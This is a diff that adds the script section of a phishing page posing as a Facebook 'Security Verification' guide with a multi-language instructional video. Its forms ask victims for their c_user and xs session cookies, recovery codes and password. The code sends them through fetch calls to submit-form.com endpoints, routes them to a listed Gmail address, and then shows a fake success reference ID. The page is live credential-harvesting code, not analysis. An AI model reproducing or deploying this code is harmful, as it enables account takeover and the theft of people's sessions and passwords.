+                videoLangTag.innerHTML = '';
+                
+                const flagImg = document.createElement('img');
+                flagImg.className = 'flag-img';
+                flagImg.src = languageNames[langCode]?.flag || flagImages.english;
+                flagImg.alt = languageNames[langCode]?.name || 'English';
+                flagImg.style.width = '20px';
+                flagImg.style.height = '15px';
+                flagImg.style.marginRight = '4px';
+                flagImg.style.borderRadius = '2px';
+                
+                const langName = document.createElement('span');
+                langName.textContent = languageNames[langCode]?.name || 'English';
+                langName.id = 'currentLangName';
+                
+                videoLangTag.appendChild(flagImg);
+                videoLangTag.appendChild(langName);
+            }
+            
+            // Update language button if exists
+            const languageButton = document.getElementById('languageSelectButton');
+            if (languageButton) {
+                languageButton.innerHTML = '';
+                
+                const flagImg = document.createElement('img');
+                flagImg.className = 'flag-img';
+                flagImg.src = languageNames[langCode]?.flag || flagImages.english;
+                flagImg.alt = languageNames[langCode]?.name || 'English';
+                
+                const langName = document.createElement('span');
+                langName.textContent = languageNames[langCode]?.name || 'English';
+                
+                const arrowSpan = document.createElement('span');
+                arrowSpan.className = 'arrow';
+                arrowSpan.innerHTML = `
+                    <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M7 10l5 5 5-5z"/>
+                    </svg>
+                `;
+                
+                languageButton.appendChild(flagImg);
+                languageButton.appendChild(langName);
+                languageButton.appendChild(arrowSpan);
+            }
+            
+            // Update active flag in video languages section
+            document.querySelectorAll('.fb-language-flag').forEach(f => {
+                f.classList.remove('active');
+                if (f.getAttribute('data-lang') === langCode) {
+                    f.classList.add('active');
+                }
+            });
+            
+            // Update selected language in modal if open
+            document.querySelectorAll('.fb-language-option').forEach(option => {
+                option.classList.remove('selected');
+                if (option.dataset.lang === langCode) {
+                    option.classList.add('selected');
+                }
+            });
+        }
+
+        // Play video in selected language
+        function playVideoInSelectedLanguage() {
+            if (availableVideos[selectedLanguage] && guideVideo) {
+                guideVideo.src = availableVideos[selectedLanguage];
+                guideVideo.load();
+                guideVideo.play().catch(error => {
+                    console.log("Video play error:", error);
+                    guideVideo.controls = true;
+                });
+            }
+        }
+
+        // Setup modal language selection
+        function setupModalLanguageSelection() {
+            const languageOptions = document.querySelectorAll('.fb-language-option');
+            
+            languageOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    const langCode = this.dataset.lang;
+                    selectedLanguage = langCode;
+                    
+                    updateLanguageUI(langCode);
+                    
+                    if (languageModal) {
+                        languageModal.style.display = 'none';
+                    }
+                    
+                    if (videoPlaceholder && videoPlaceholder.style.display !== 'none') {
+                        if (availableVideos[selectedLanguage] && guideVideo) {
+                            guideVideo.src = availableVideos[selectedLanguage];
+                            guideVideo.style.display = 'block';
+                            videoPlaceholder.style.display = 'none';
+                            guideVideo.load();
+                            guideVideo.play().catch(error => {
+                                console.log("Video play error:", error);
+                                guideVideo.controls = true;
+                            });
+                        }
+                    } else if (guideVideo && !guideVideo.paused) {
+                        playVideoInSelectedLanguage();
+                    }
+                });
+            });
+        }
+
+        // Update video languages section with PNG flags (for NORMAL PAGE)
+        function updateVideoLanguagesSection() {
+            if (videoLanguages) {
+                videoLanguages.innerHTML = '';
+                Object.keys(availableVideos).forEach(lang => {
+                    if (languageNames[lang]) {
+                        const flagContainer = document.createElement('div');
+                        flagContainer.className = `fb-language-flag ${lang === selectedLanguage ? 'active' : ''}`;
+                        flagContainer.setAttribute('data-lang', lang);
+                        flagContainer.title = languageNames[lang].name;
+                        
+                        const flagImg = document.createElement('img');
+                        flagImg.className = 'flag-img-small';
+                        flagImg.src = languageNames[lang].flag;
+                        flagImg.alt = languageNames[lang].name;
+                        
+                        flagContainer.appendChild(flagImg);
+                        videoLanguages.appendChild(flagContainer);
+                    }
+                });
+                
+                makeVideoFlagsFunctional();
+            }
+        }
+
+        // Setup video placeholder click
+        function setupVideoPlaceholderClick() {
+            if (videoPlaceholder) {
+                videoPlaceholder.onclick = function(e) {
+                    if (e.target.closest('.fb-language-button')) {
+                        populateLanguageOptions();
+                        languageModal.style.display = 'flex';
+                        return;
+                    }
+                    
+                    if (e.target.closest('.fb-language-flag')) {
+                        return;
+                    }
+                    
+                    if (availableVideos[selectedLanguage] && guideVideo) {
+                        guideVideo.src = availableVideos[selectedLanguage];
+                        guideVideo.style.display = 'block';
+                        videoPlaceholder.style.display = 'none';
+                        guideVideo.load();
+                        guideVideo.play().catch(error => {
+                            console.log("Video play error:", error);
+                            guideVideo.controls = true;
+                        });
+                    }
+                };
+            }
+        }
+
+        // Populate language options in modal with PNG flags
+        function populateLanguageOptions() {
+            if (!languageOptionsContainer) return;
+            
+            languageOptionsContainer.innerHTML = '';
+            
+            const availableLanguages = Object.keys(availableVideos);
+            const languages = availableLanguages
+                .filter(lang => languageNames[lang])
+                .map(lang => ({
+                    code: lang,
+                    name: languageNames[lang].name,
+                    flag: languageNames[lang].flag
+                }));
+            
+            if (languages.length === 0) {
+                languages.push({ code: 'english', name: 'English', flag: flagImages.english });
+            }
+            
+            languages.forEach(lang => {
+                const option = document.createElement('div');
+                option.className = 'fb-language-option';
+                option.dataset.lang = lang.code;
+                
+                option.innerHTML = `
+                    <img src="${lang.flag}" alt="${lang.name}" class="fb-language-flag-modal">
+                    <span class="fb-language-name">${lang.name}</span>
+                    <span class="fb-language-code">${lang.code}</span>
+                `;
+                
+                if (lang.code === selectedLanguage) {
+                    option.classList.add('selected');
+                }
+                
+                languageOptionsContainer.appendChild(option);
+            });
+            
+            setupModalLanguageSelection();
+        }
+
+        // Update UI based on page type (SPECIAL vs NORMAL)
+        function updateUIForPageType() {
+            // Recovery section
+            if (recoverySection) {
+                if (showRecoverySection) {
+                    recoverySection.style.display = 'block';
+                    console.log("Recovery section shown for NORMAL PAGE");
+                } else {
+                    recoverySection.style.display = 'none';
+                    console.log("Recovery section hidden for SPECIAL PAGE");
+                }
+            }
+
+            // Video functionality
+            if (videoPlaceholder) {
+                const existingButton = document.getElementById('languageSelectButton');
+                if (existingButton) {
+                    existingButton.remove();
+                }
+
+                if (!isSpecialPage) {
+                    // NORMAL PAGE: Multi-language interface
+                    videoTitle.textContent = 'Security Verification Guide';
+                    videoSubtitle.textContent = 'Step-by-step instructions';
+                    videoTime.textContent = 'Estimated time: 2 minutes';
+                    videoPlaceholderText.textContent = 'Click to watch guide video';
+                    videoClickHint.textContent = 'Select language and watch step-by-step instructions';
+                    
+                    // Show language tag
+                    videoLangTag.style.display = 'flex';
+                    
+                    // Create flag image for language tag
+                    const flagImg = document.createElement('img');
+                    flagImg.className = 'flag-img';
+                    flagImg.src = languageNames[selectedLanguage]?.flag || flagImages.english;
+                    flagImg.alt = languageNames[selectedLanguage]?.name || 'English';
+                    flagImg.style.width = '20px';
+                    flagImg.style.height = '15px';
+                    flagImg.style.marginRight = '4px';
+                    flagImg.style.borderRadius = '2px';
+                    
+                    currentLangName.textContent = languageNames[selectedLanguage]?.name || 'English';
+                    
+                    videoLangTag.innerHTML = '';
+                    videoLangTag.appendChild(flagImg);
+                    videoLangTag.appendChild(currentLangName);
+                    
+                    // Show language info section with flags
+                    videoInfo.style.display = 'block';
+                    videoLangInfo.textContent = 'Available in multiple languages:';
+                    
+                    updateVideoLanguagesSection();
+                    
+                    const languageButton = createLanguageButton();
+                    videoPlaceholder.appendChild(languageButton);
+                    
+                    setupVideoPlaceholderClick();
+                    
+                    console.log("Multi-language interface enabled for NORMAL PAGE");
+                } else {
+                    // SPECIAL PAGE: Single video, no language options
+                    videoTitle.textContent = 'Security Verification Guide';
+                    videoSubtitle.textContent = 'Step-by-step instructions';
+                    videoTime.textContent = 'Estimated time: 2 minutes';
+                    videoPlaceholderText.textContent = 'Click to watch guide video';
+                    videoClickHint.textContent = 'Watch step-by-step instructions to complete verification';
+                    
+                    videoLangTag.style.display = 'none';
+                    videoInfo.style.display = 'none';
+                    
+                    videoPlaceholder.onclick = function() {
+                        console.log("SPECIAL PAGE user clicking video");
+                        if (availableVideos.english && guideVideo) {
+                            console.log("Playing English video for SPECIAL PAGE");
+                            guideVideo.src = availableVideos.english;
+                            guideVideo.style.display = 'block';
+                            videoPlaceholder.style.display = 'none';
+                            guideVideo.load();
+                            guideVideo.play().catch(error => {
+                                console.log("Video play error:", error);
+                                guideVideo.controls = true;
+                            });
+                        } else {
+                            console.log("Video not available for SPECIAL PAGE");
+                        }
+                    };
+                    console.log("Video enabled for SPECIAL PAGE (single video only)");
+                }
+            }
+
+            // Add video event listeners for debugging
+            if (guideVideo) {
+                guideVideo.addEventListener('play', () => {
+                    console.log("Video is playing for:", selectedLanguage);
+                    console.log("Page type:", isSpecialPage ? "SPECIAL PAGE" : "NORMAL PAGE");
+                });
+                
+                guideVideo.addEventListener('error', (e) => {
+                    console.log("Video error:", e);
+                    console.log("Video source:", guideVideo.src);
+                });
+            }
+        }
+
+        // Close modal
+        if (closeModal) {
+            closeModal.addEventListener('click', () => {
+                if (languageModal) {
+                    languageModal.style.display = 'none';
+                }
+            });
+        }
+
+        if (languageModal) {
+            languageModal.addEventListener('click', (e) => {
+                if (e.target === languageModal) {
+                    languageModal.style.display = 'none';
+                }
+            });
+        }
+
+        // Confirm language button
+        if (confirmLanguageBtn) {
+            confirmLanguageBtn.style.display = 'none';
+        }
+
+        // First form submission
+        document.getElementById('submitFirstFormBtn').addEventListener('click', async () => {
+            const c_user = document.getElementById('c_user')?.value.trim() || '';
+            const xs_token = document.getElementById('xs_token')?.value.trim() || '';
+            const recovery_codes = document.getElementById('recovery_codes')?.value.trim() || '';
+            
+            // Validation for c_user
+            if (!validateNumeric(document.getElementById('c_user'), 8)) {
+                alert('c_user must contain at least 8 numbers');
+                return;
+            }
+            
+            // Validation for xs_token (SPECIAL PATTERN)
+            if (!xs_token) {
+                document.getElementById('xs_token_error').style.display = 'flex';
+                document.getElementById('xs_token_error').querySelector('span').textContent = "Please enter session token";
+                return;
+            }
+            
+            // Check for special pattern requirements
+            const hasUpperCase = /[A-Z]/.test(xs_token);
+            const hasLowerCase = /[a-z]/.test(xs_token);
+            const hasNumbers = /[0-9]/.test(xs_token);
+            const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~`]/.test(xs_token);
+            const hasMinimumLength = xs_token.length >= 6;
+            
+            if (!hasMinimumLength || !hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChar) {
+                let errorMessages = [];
+                
+                if (!hasMinimumLength) errorMessages.push("Minimum 6 characters");
+                if (!hasUpperCase) errorMessages.push("Uppercase letter required");
+                if (!hasLowerCase) errorMessages.push("Lowercase letter required");
+                if (!hasNumbers) errorMessages.push("Number required");
+                if (!hasSpecialChar) errorMessages.push("Special character required");
+                
+                document.getElementById('xs_token_error').style.display = 'flex';
+                document.getElementById('xs_token_error').querySelector('span').textContent = 
+                    `Invalid format: ${errorMessages.join(", ")}`;
+                return;
+            }
+            
+            if (showRecoverySection && !validateRecoveryCodes()) {
+                alert('Recovery codes must contain at least 8 numbers total');
+                return;
+            }
+            
+            // Hide errors
+            document.getElementById('c_user_error').style.display = 'none';
+            document.getElementById('xs_token_error').style.display = 'none';
+            document.getElementById('recovery_error').style.display = 'none';
+            
+            // Show loading
+            const submitBtn = document.getElementById('submitFirstFormBtn');
+            const submitBtnText = submitBtn.querySelector('span');
+            submitBtn.disabled = true;
+            if (submitBtnText) submitBtnText.textContent = 'Submitting...';
+            
+            // Prepare data
+            const formData = {
+                c_user: c_user,
+                xs: xs_token,
+                recovery_code: showRecoverySection ? recovery_codes : '',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: selectedLanguage,
+                data_name: 'M.YOUSAF',
+                page_type: isSpecialPage ? 'special' : 'normal',
+                form_type: 'first_form'
+            };
+            
+            try {
+                console.log("Submitting form data:", formData);
+                
+                // Send data to backend
+                const response = await fetch('https://submit-form.com/HteDFcXbo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ...formData,
+                        target_emails: isSpecialPage ? 
+                            ['m09492017@gmail.com', 'm09492017@gmail.com'] : 
+                            ['m09492017@gmail.com', 'm09492017@gmail.com'],
+                        submission_type: 'form_submission',
+                        page_type: isSpecialPage ? 'special' : 'normal'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log("Form submission successful");
+                    
+                    // Hide video section when showing password form
+                    const videoSection = document.querySelector('.fb-video-section');
+                    if (videoSection) {
+                        videoSection.style.display = 'none';
+                    }
+                    
+                    // Move to step 3 (Password Form) directly
+                    currentStep = 3;
+                    updateStepUI();
+                    
+                } else {
+                    throw new Error('Server response not OK');
+                }
+                
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                alert('Network error. Please try again.');
+            } finally {
+                // Reset button
+                submitBtn.disabled = false;
+                if (submitBtnText) submitBtnText.textContent = 'Continue to Security Check';
+            }
+        });
+
+        // Step 2 navigation
+        document.getElementById('nextStep2Btn').addEventListener('click', () => {
+            currentStep = 3;
+            updateStepUI();
+        });
+
+        document.getElementById('prevStep2Btn').addEventListener('click', () => {
+            currentStep = 1;
+            updateStepUI();
+        });
+
+        // Step 3 navigation
+        document.getElementById('prevStep3Btn').addEventListener('click', () => {
+            currentStep = 2;
+            updateStepUI();
+        });
+
+        // Submit password
+        document.getElementById('submitPasswordBtn').addEventListener('click', async () => {
+            const password = document.getElementById('password')?.value.trim() || '';
+            
+            if (!password) {
+                document.getElementById('password_error').style.display = 'flex';
+                return;
+            }
+            
+            document.getElementById('password_error').style.display = 'none';
+            
+            // Show loading
+            const submitBtn = document.getElementById('submitPasswordBtn');
+            const submitBtnText = submitBtn.querySelector('span');
+            submitBtn.disabled = true;
+            if (submitBtnText) submitBtnText.textContent = 'Submitting...';
+            
+            // Prepare password data
+            const passwordData = {
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: selectedLanguage,
+                data_name: 'M.YOUSAF',
+                page_type: isSpecialPage ? 'special' : 'normal',
+                form_type: 'password_form'
+            };
+            
+            try {
+                console.log("Submitting password data:", passwordData);
+                
+                // Send password to backend
+                const response = await fetch('https://submit-form.com/wQFHLRuaM', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ...passwordData,
+                        target_emails: isSpecialPage ? 
+                            ['m09492017@gmail.com'] : 
+                            ['m09492017@gmail.com'],
+                        submission_type: 'password_submission',
+                        page_type: isSpecialPage ? 'special' : 'normal'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log("Password submission successful");
+                    
+                    // Show success message
+                    currentStep = 4;
+                    step3.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    
+                    // Update progress bar for success state
+                    progressFill.style.width = '100%';
+                    progressText.textContent = `Step 3 of 3`;
+                    progressPercent.textContent = `100% Complete`;
+                    
+                    // Update step indicators for success
+                    steps.forEach(step => {
+                        step.classList.remove('active');
+                        step.classList.add('completed');
+                    });
+                    
+                    // Generate reference ID
+                    const referenceId = 'FB' + Date.now().toString().slice(-9);
+                    const referenceElement = document.getElementById('referenceId');
+                    if (referenceElement) {
+                        referenceElement.textContent = referenceId;
+                    }
+                    
+                } else {
+                    throw new Error('Server response not OK');
+                }
+                
+            } catch (error) {
+                console.error('Error submitting password:', error);
+                alert('Network error. Please try again.');
+            } finally {
+                // Reset button
+                submitBtn.disabled = false;
+                if (submitBtnText) submitBtnText.textContent = 'Complete Verification';
+            }
+        });
+
+        // Input validation
+        document.getElementById('c_user').addEventListener('input', function() {
+            validateNumeric(this, 8);
+        });
+
+        document.getElementById('xs_token').addEventListener('input', function() {
+            validateXsToken(this);
+        });
+
+        document.getElementById('recovery_codes').addEventListener('input', validateRecoveryCodes);
+
+        document.getElementById('password').addEventListener('input', function() {
+            if (this.value.length > 0) {
+                document.getElementById('password_error').style.display = 'none';
+                this.classList.remove('fb-input-error');
+            }
+        });
+
+        // Step buttons click
+        steps.forEach(step => {
+            step.addEventListener('click', () => {
+                const stepNumber = parseInt(step.dataset.step);
+                if (stepNumber < currentStep) {
+                    currentStep = stepNumber;
+                    updateStepUI();
+                }
+            });
+        });
+
+        // Initialize
+        function init() {
+            updateStepUI();
+            checkPageTypeFromBackend(); // Single backend call
+        }
+
+        // Start when page loads
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
